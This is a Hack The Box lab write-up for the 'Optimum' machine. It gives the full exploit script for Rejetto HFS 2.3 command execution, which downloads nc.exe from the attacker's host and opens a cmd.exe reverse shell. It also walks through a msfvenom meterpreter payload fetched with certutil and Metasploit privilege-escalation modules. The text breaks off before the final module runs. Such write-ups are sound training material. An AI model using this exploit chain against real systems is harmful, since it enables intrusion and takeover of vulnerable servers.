# References
1. [Optimum Writeup (or10nlabs.tech)](https://or10nlabs.tech/hackthebox-optimum/)
2. [Optimum Writeup (medium.com)](https://medium.com/@nmappn/htb-optimum-writeup-9680466f01f7)

# Summary
### 1. NMAP
Running NMAP, we see there's only Port 80 open. Thankfully we have only one thing to focus on!

### 2. Enumeration: Searchsploit & Dirbuster
Seeing Searchsploit for `HFS 2.3`, we see a couple of vulnerabilties that we can use. Dirbuster didn't work correctly unfortunately.

### 3. Attacking HFS 2.3
We end up using a Remote Command Execution vulnerabiltiy, by downloading and editing the provided Python script, in order to get a regular reverse shell from it. Alternatively, there was a Metasploit module for this vulnerabiltiy which we did not use. 

At this point, we managed to get the user flag. Since we did not have system/administrator privileges, we could not get the system flag.

### 4. Privilege Escalation
In order to privilege esclate, we need to understand our environment more, which we did with `systeminfo`. We see that the machine we are attacking is a Microsoft Windows Server 2012 R2 Standard x64. Doing some searching, we see that this OS is susceptible to `MS14-058` & `MS16-032`, with existing Metasploit modules we could leverage on.

Since these needed a existing Metasploit session, we had to run our listener with Metasploit instead of just using a netcat listener. We try to get a `windows/x64/meterpreter/reverse_tcp` listener/payload, but that failed. We defaulted to using a regular `windows/x64/shell/reverse_tcp` listener/payload which worked.

### 5. First Attempt on MS14-058 & MS16-032
Our first attempt with `exploit/windows/local/ms14_058_track_popup_menu` metasploit module failed, as with `exploit/windows/local/ms16_032_secondary_logon_handle_privesc`. We probably need a meterpreter shell instead of a regular metasploit windows shell to make it work.

### 6. Second Attempt on MS14-058 & MS16-032
We create a meterpreter reverse shell payload as an executable using `msfvenom`. To transfer, we host the payload using `SimpleHTTPServer` on our Kali machine, and downloading that hosted payload onto the target machine with the regular shell we have access to, using `certutil.exe`. After downloading it, all we had to do was use a `multi/handler` to listen for the incoming reverse meterpreter shell when executing the reverse shell payload.

Through this, we got a meterpreter shell successfully. We try `exploit/windows/local/ms14_058_track_popup_menu`, but that did not work. We move on to `exploit/windows/local/ms16_032_secondary_logon_handle_privesc`, which worked wonderfully, giving us a privileged meterpreter shell. With access to System/Administrator, we got the system flag.

# Attack
## 1. NMAP
Business as usual.
```
hippoeug@kali:~$ nmap -sC -sV 10.10.10.8 -Pn -v
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-03 13:54 +08
...
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
...
```
Wow, only Port 80, a HttpFileServer is open.

Let's see another vulnerability NMAP script.
```
hippoeug@kali:~$ nmap --script vuln 10.10.10.8 -Pn -v
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-03 14:01 +08
...
PORT   STATE SERVICE
80/tcp open  http
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-fileupload-exploiter: 
|   
|_    Couldn't find a file-type field.
| http-method-tamper: 
|   VULNERABLE:
|   Authentication bypass by HTTP verb tampering
|     State: VULNERABLE (Exploitable)
|       This web server contains password protected resources vulnerable to authentication bypass
|       vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the
|        common HTTP methods and in misconfigured .htaccess files.
|              
|     Extra information:
|       
|   URIs suspected to be vulnerable to HTTP verb tampering:
|     /~login [GENERIC]
|   
|     References:
|       https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29
|       http://capec.mitre.org/data/definitions/274.html
|       http://www.imperva.com/resources/glossary/http_verb_tampering.html
|_      http://www.mkit.com.ar/labs/htexploit/
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://seclists.org/fulldisclosure/2011/Aug/175
|       https://www.securityfocus.com/bid/49303
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|_      https://www.tenable.com/plugins/nessus/55976
...
```
Wow, a couple of vulnerabilities it seems. but mainly for DoS. Let's take a quick look at `http-method-tamper` links and try something.
```
hippoeug@kali:~$ nmap -p 80 --script http-methods 10.10.10.8
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-03 14:37 +08
...
PORT   STATE SERVICE
80/tcp open  http
| http-methods: 
|_  Supported Methods: GET HEAD POST
```
Hmm, nothing interesting AFAIK. Testing another..
```
hippoeug@kali:~$ nc 10.10.10.8 80

```
No response from netcat attempt.

Let's KIV those and move on to a little more enumeration.

## 2. Enumeration: Searchsploit & Dirbuster
Let's run some Searchsploit and see what we get.
```
hippoeug@kali:~$ searchsploit httpfileserver
Exploits: No Results
Shellcodes: No Results
```
No results, next.

What about `httpd 2.3`?
```
hippoeug@kali:~$ searchsploit httpd 2.3
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
OpenBSD HTTPd < 6.0 - Memory Exhaustion Denial of Service                                                                           | openbsd/dos/41278.txt
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Ah, DoS, not very useful. Next.

What about the header `HFS 2.3`?
```
hippoeug@kali:~$ searchsploit hfs 2.3
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                                                         | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                      | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                 | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                 | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                            | windows/webapps/34852.txt
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Wow, looks like quite a few things!

Let's see Dirbuster!
```
hippoeug@kali:~$ dirbuster
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
Jan 03, 2021 2:17:11 PM org.apache.commons.httpclient.HttpMethodBase readResponseBody
INFO: Response content length is not known
Jan 03, 2021 2:17:11 PM org.apache.commons.httpclient.HttpMethodBase readResponseBody
INFO: Response content length is not known
ERROR: http://10.10.10.8:80/home.php - IOException The server 10.10.10.8 failed to respond with a valid HTTP response
ERROR: http://10.10.10.8:80/2005.php - IOException The server 10.10.10.8 failed to respond with a valid HTTP response
ERROR: http://10.10.10.8:80/sitemap.php - IOException The server 10.10.10.8 failed to respond with a valid HTTP response
ERROR: http://10.10.10.8:80/archives.php - IOException The server 10.10.10.8 failed to respond with a valid HTTP response
ERROR: http://10.10.10.8:80/support.php - IOException The server 10.10.10.8 failed to respond with a valid HTTP response
ERROR: http://10.10.10.8:80/keygen.php - IOException The server 10.10.10.8 failed to respond with a valid HTTP response
ERROR: http://10.10.10.8:80/index/ - IOException The server 10.10.10.8 failed to respond with a valid HTTP response
ERROR: http://10.10.10.8:80/04.php - IOException The server 10.10.10.8 failed to respond with a valid HTTP response
ERROR: http://10.10.10.8:80/crack/ - IOException The server 10.10.10.8 failed to respond with a valid HTTP response
ERROR: http://10.10.10.8:80/archive.php - IOException The server 10.10.10.8 failed to respond with a valid HTTP response
Dir found: / - 200
ERROR: http://10.10.10.8:80/register.php - IOException The server 10.10.10.8 failed to respond with a valid HTTP response
Jan 03, 2021 2:17:12 PM au.id.jericho.lib.html.LoggerProviderJava$JavaLogger info
INFO: StartTag a at (r45,c3,p1451) contains a '/' character before the closing '>', which is ignored because tags of this name cannot be empty-element tags
ERROR: http://10.10.10.8:80/new/ - IOException The server 10.10.10.8 failed to respond with a valid HTTP response
ERROR: http://10.10.10.8:80/press.php - IOException The server 10.10.10.8 failed to respond with a valid HTTP response
ERROR: http://10.10.10.8:80/media.php - IOException The server 10.10.10.8 failed to respond with a valid HTTP response
ERROR: http://10.10.10.8:80/16.php - IOException The server 10.10.10.8 failed to respond with a valid HTTP response
ERROR: http://10.10.10.8:80/sitemap/ - IOException The server 10.10.10.8 failed to respond with a valid HTTP response
ERROR: http://10.10.10.8:80/docs.php - IOException The server 10.10.10.8 failed to respond with a valid HTTP response
Jan 03, 2021 2:17:12 PM au.id.jericho.lib.html.LoggerProviderJava$JavaLogger info
INFO: StartTag at (r9,c5,p361) missing required end tag - invalid nested start tag encountered before end tag
ERROR: http://10.10.10.8:80/08/ - IOException The server 10.10.10.8 failed to respond with a valid HTTP response
ERROR: http://10.10.10.8:80/22.php - IOException The server 10.10.10.8 failed to respond with a valid HTTP response
ERROR: http://10.10.10.8:80/articles/ - IOException The server 10.10.10.8 failed to respond with a valid HTTP response
Jan 03, 2021 2:17:16 PM org.apache.commons.httpclient.HttpMethodBase readResponseBody
INFO: Response content length is not known
```
What's this! Content length not known?!

## 3. Attacking HFS 2.3
The first Searchsploit result `Buffer Overflow (PoC)` seems to be about DoS. Moving on, the second result `Arbitrary File Upload` wasn't useful. Thirdly, the third result `Remote Command Execution (1)` didn't have detailed documentation, and I do not know how to exploit this ([External Online Guide](https://www.jdksec.com/hack-the-box/optimum)). Finally, the forth result `Remote Command Execution (2)` looks promising so we're going to attempt to use this Python script.

Let's copy the file to our workspace and work from there.
```
hippoeug@kali:~$ searchsploit -m 39161.py                                                                                                                             
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
      URL: https://www.exploit-db.com/exploits/39161
     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators

Copied to: /home/hippoeug/39161.py
```

Let's edit the file and execute it.
```
hippoeug@kali:~$ nano 39161.py
```
We must change the local listening IP address (our kali machine) and the port.

Overall, this is how our Python script looks after changing the IP and port to 80.
```
#!/usr/bin/python
# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
...
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287
# Description: You can use HFS (HTTP File Server) to send and receive files.
#	       It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.
#	       It also differs from classic web servers because it's very easy to use and runs "right out-of-the box". Access your remote files, over the network. It has been successfully tested with Wine under Linux. 
 
#Usage : python Exploit.py <Target IP address> <Target Port Number>

#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).  
#          You may need to run it multiple times for success!

import urllib2
import sys

try:
	def script_create():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")

	def execute_script():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")

	def nc_run():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")

	ip_addr = "10.10.x.x" # Local IP address
 	local_port = "80" # Local Port number
	vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
	save= "save|" + vbs
	vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
	exe= "exec|"+vbs2
	vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
	exe1= "exec|"+vbs3
	script_create()
	execute_script()
	nc_run()
except:
	print """[.]Something went wrong..!
	Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
	Don't forgot to change the Local IP address and Port number on the script"""
```
Let's try it out.

First, we start a listener with `sudo nc -lvnp 80` before executing the Python script with `python 39161.py 10.10.10.8 80`.
```
hippoeug@kali:~$ sudo nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.x.x] from (UNKNOWN) [10.10.10.8] 49322
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: el
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; WOW64; Trident/7.0; .NET4.0E; .NET4.0C)
Host: 10.10.x.x
Connection: Keep-Alive
```
Interesting, we get a `GET /nc.exe HTTP/1.1` request. And sure enough, on the comments of the Python script, it mentions `EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe)`.

Let's host a `nc.exe` using Python SimpleHTTPServer on Port 80.
```
hippoeug@kali:~/Documents$ sudo python -m SimpleHTTPServer 80
[sudo] password for hippoeug: 
Serving HTTP on 0.0.0.0 port 80 ...
```

We also need to change our port on our Python script to something else, since 80 is used to host `nc.exe`. We will use 443.
```
hippoeug@kali:~$ nano 39161.py
...
        ip_addr = "10.10.x.x" # Local IP address
        local_port = "443" # Local Port number
...
```
After which, we start a listener again on Port 443 with `sudo nc -lvnp 443` and execute the Pythohn script with `python 39161.py 10.10.10.8 80`.
```
hippoeug@kali:~$ sudo nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.x.x] from (UNKNOWN) [10.10.10.8] 49330
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
C:\Users\kostas\Desktop>

C:\Users\kostas\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D0BC-0196

 Directory of C:\Users\kostas\Desktop

09/01/2021  04:47 ��    <DIR>          .
09/01/2021  04:47 ��    <DIR>          ..
18/03/2017  02:11 ��           760.320 hfs.exe
18/03/2017  02:13 ��                32 user.txt.txt
               2 File(s)        760.352 bytes
               2 Dir(s)  31.899.250.688 bytes free
```
Success!

**NOTE: There is a metasploit module for this `39161.py` vulnerability, [Rejetto HttpFileServer Remote Command Execution](https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/).**

Let's get our first flag!
```
C:\Users\kostas\Desktop>type user.txt.txt
type user.txt.txt
d0c39409d7b994a9a1389ebf38ef5f73
```
We now need to get the system flag.

Let's look at the other accounts on the system and try access them.
```
C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D0BC-0196

 Directory of C:\Users

18/03/2017  01:57 ��    <DIR>          .
18/03/2017  01:57 ��    <DIR>          ..
18/03/2017  01:52 ��    <DIR>          Administrator
18/03/2017  01:57 ��    <DIR>          kostas
09/01/2021  07:04 ��    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  31.899.250.688 bytes free

C:\Users>cd Administrator
cd Administrator
Access is denied.
```
Unfortunately, we do not have administrative rights. Time for privilege escalation.

## 4. Privilege Escalation
First, let's enumerate the actual system we are on!
```
C:\Users>systeminfo
systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ��
System Boot Time:          9/1/2021, 4:45:50 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.456 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.885 MB
Virtual Memory: In Use:    618 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```
From this, we know it's Microsoft Windows Server 2012 R2 Standard x64.

Let's do a quick Searchsploit and Google search.
```
hippoeug@kali:~$ searchsploit windows server 2012
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
...
Microsoft Windows 8.1/ Server 2012 - 'Win32k.sys' Local Privilege Escalation (MS14-058)                                             | windows/local/46945.cpp
...
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
```
Googling "windows server 2012 r2 privilege escalation", we see an exploit for `MS16-032`.

Both [`MS14-058`](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-058) and [`MS16-032`](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032) vulnerabilties have Metasploit exploits for them. 

For `MS14-058`:
```
msf5 > use exploit/windows/local/ms14_058_track_popup_menu
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/local/ms14_058_track_popup_menu) > show options

Module options (exploit/windows/local/ms14_058_track_popup_menu):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.
...
```
For `MS16-032`:
```
msf5 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp   
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show options

Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.
...
```
However, they require existing Metasploit sessions before privilege esclating them.

Let's try to get a Meterpreter session!
```
msf5 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > show options
...
msf5 exploit(multi/handler) > set lhost 10.10.x.x
lhost => 10.10.x.x
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.x.x:4444 
[*] Sending stage (201283 bytes) to 10.10.10.8
[*] Sending stage (201283 bytes) to 10.10.10.8
[*]  - Meterpreter session 1 closed.  Reason: Died
[*] Meterpreter session 1 opened (10.10.x.x:4444 -> 127.0.0.1) at 2021-01-17 11:55:51 +0800
[*] Sending stage (201283 bytes) to 10.10.10.8
[*] Meterpreter session 2 opened (10.10.x.x:4444 -> 127.0.0.1) at 2021-01-17 11:55:52 +0800
[*] Sending stage (201283 bytes) to 10.10.10.8
[*]  - Meterpreter session 2 closed.  Reason: Died
[*]  - Meterpreter session 3 closed.  Reason: Died
[*] Meterpreter session 3 opened (10.10.x.x:4444 -> 127.0.0.1) at 2021-01-17 11:55:52 +0800
```
Nope, we can't get a Meterpreter shell directly.

Let's try to get a regular x64 Windows reverse shell then!
```
msf5 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf5 exploit(multi/handler) > show options
...
msf5 exploit(multi/handler) > set lhost 10.10.x.x
lhost => 10.10.x.x
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.x.x:4444 
[*] Sending stage (336 bytes) to 10.10.10.8
[*] Command shell session 1 opened (10.10.x.x:4444 -> 10.10.10.8:49166) at 2021-01-17 11:41:46 +0800
[*] Sending stage (336 bytes) to 10.10.10.8
[*] Command shell session 2 opened (10.10.x.x:4444 -> 10.10.10.8:49167) at 2021-01-17 11:41:46 +0800
[*] Sending stage (336 bytes) to 10.10.10.8
```
Looking at Sessions, we see we have established regular x64 shells.
```
msf5 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type               Information                                                                       Connection
  --  ----  ----               -----------                                                                       ----------
  1         shell x64/windows  Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All righ...  10.10.x.x:4444 -> 10.10.10.8:49166 (10.10.10.8)
  2         shell x64/windows  Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All righ...  10.10.x.x:4444 -> 10.10.10.8:49167 (10.10.10.8)
  3         shell windows                                                                                        10.10.x.x:4444 -> 10.10.10.8:49168 (10.10.10.8)
```

## 5. First Attempt on MS14-058 & MS16-032
Upon getting a regular shell, let's try to elevate it with the Metasploit modules!

First we try with `MS14-058`:
```
msf5 > use exploit/windows/local/ms14_058_track_popup_menu
[*] Using configured payload windows/meterpreter/reverse_tcp
msf5 exploit(windows/local/ms14_058_track_popup_menu) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Windows x86
   1   Windows x64


msf5 exploit(windows/local/ms14_058_track_popup_menu) > set target 1
target => 1
msf5 exploit(windows/local/ms14_058_track_popup_menu) > show options
...
msf5 exploit(windows/local/ms14_058_track_popup_menu) > set lhost 10.10.x.x
lhost => 10.10.x.x
msf5 exploit(windows/local/ms14_058_track_popup_menu) > set lport 4545
lport => 4545
msf5 exploit(windows/local/ms14_058_track_popup_menu) > set session 1
session => 1
msf5 exploit(windows/local/ms14_058_track_popup_menu) > run

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 10.10.x.x:4545 
[-] Exploit failed: NoMethodError undefined method `reverse!' for nil:NilClass
[*] Exploit completed, but no session was created.
```
Ah, SESSION may not be compatible with this module. This module was not successfully run.

Let's try `MS16-032`:
```
msf5 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
[*] Using configured payload windows/meterpreter/reverse_tcp
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show targets
...
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set target 1
target => 1
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show options
...
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lhost 10.10.x.x
lhost => 10.10.x.x
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lport 4545
lport => 4545
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
session => 1
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 10.10.x.x:4545 
[-] Exploit aborted due to failure: none: Session is already elevated
[+] Deleted 
[*] Exploit completed, but no session was created.
```
Same thing, SESSION may not be compatible with this module. But Session is already elevated.. what??

## 6. Second Attempt on MS14-058 & MS16-032
Let's create a Meterpreter reverse shell payload, transfer and run it.
```
hippoeug@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=4545 -f exe -o meterpreter.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: meterpreter.exe
```
We now need to transfer this file over to the target machine. Using the previous infrastructure `sudo python -m SimpleHTTPServer 80`, we can host the file.

Let's go back to the regular shell and download our hosted `meterpreter.exe`. We can refer to our old attempt on HTB, [Devel](https://github.com/HippoEug/HackTheBox/blob/main/Machines%20(Easy)/Devel.md) where we used `certutil.exe` to download the payload.
```
msf5 > sessions -i 1
[*] Starting interaction with 1...

C:\Users\kostas\Desktop>certutil.exe -urlcache -split -f "http://10.10.x.x:80/meterpreter.exe" meterpreter.exe
certutil.exe -urlcache -split -f "http://10.10.x.x:80/meterpreter.exe" meterpreter.exe
****  Online  ****
  0000  ...
  1c00
CertUtil: -URLCache command completed successfully.

C:\Users\kostas\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D0BC-0196

 Directory of C:\Users\kostas\Desktop

23/01/2021  04:59 ��    <DIR>          .
23/01/2021  04:59 ��    <DIR>          ..
18/03/2017  02:11 ��           760.320 hfs.exe
18/03/2017  02:13 ��                32 user.txt.txt
23/01/2021  05:04 ��             7.168 meterpreter.exe
               2 File(s)        767.488 bytes
               2 Dir(s)  31.897.223.168 bytes free
```
We got our payload in successfully!

Time to run another listener, before executing the `meterpreter.exe` payload we inserted. We open another terminal for msfconsole.
```
hippoeug@kali:~$ msfconsole
...
msf5 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > show options
...
msf5 exploit(multi/handler) > set lhost 10.10.x.x
lhost => 10.10.x.x
msf5 exploit(multi/handler) > set lport 4545
lport => 4545
```
Let's run it with `exploit`.

We go back to our previous terminal with the regular shell to execute our payload.
```
C:\Users\kostas\Desktop>meterpreter.exe
meterpreter.exe
```

Let's go back to the new terminal to see if we get a meterpreter reverse shell connection.
```
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.x.x:4545 
[*] Sending stage (201283 bytes) to 10.10.10.8
[*] Meterpreter session 1 opened (10.10.x.x:4545 -> 10.10.10.8:49204) at 2021-01-17 14:22:40 +0800

meterpreter > background
msf5 > sessions 

Active sessions
===============

  Id  Name  Type                     Information               Connection
  --  ----  ----                     -----------               ----------
  1         meterpreter x64/windows  OPTIMUM\kostas @ OPTIMUM  10.10.x.x:4545 -> 10.10.10.8:49204 (10.10.10.8)
```
Indeed we did!

First step, `getsystem` lol.
```
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
```
Nope.

Let's try the `MS14_058` exploit first.
```
msf5 > use exploit/windows/local/ms14_058_track_popup_menu
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/local/ms14_058_track_popup_menu) > show targets
...
msf5 exploit(windows/local/ms14_058_track_popup_menu) > set target 1
target => 1
msf5 exploit(windows/local/ms14_058_track_popup_menu) > show options
...
msf5 exploit(windows/local/ms14_058_track_popup_menu) > set lhost 10.10.x.x
lhost => 10.10.x.x
msf5 exploit(windows/local/ms14_058_track_popup_menu) > set lport 4646
lport => 4646
msf5 exploit(windows/local/ms14_058_track_popup_menu) > set session 1
session => 1
msf5 exploit(windows/local/ms14_058_track_popup_menu) > run

[*] Started reverse TCP handler on 10.10.x.x:4646 
[-] Exploit aborted due to failure: not-vulnerable: Exploit not available on this system.
[*] Exploit completed, but no session was created.
```
Hmm, this did not work.

Let's try the alternative `MS16_032`.
```
msf5 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show targets
...
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set target 1
target => 1
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show options
...
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lhost 10.10.x.x
lhost => 10.10.x.x
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lport 4646
lport => 4646
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
session => 1
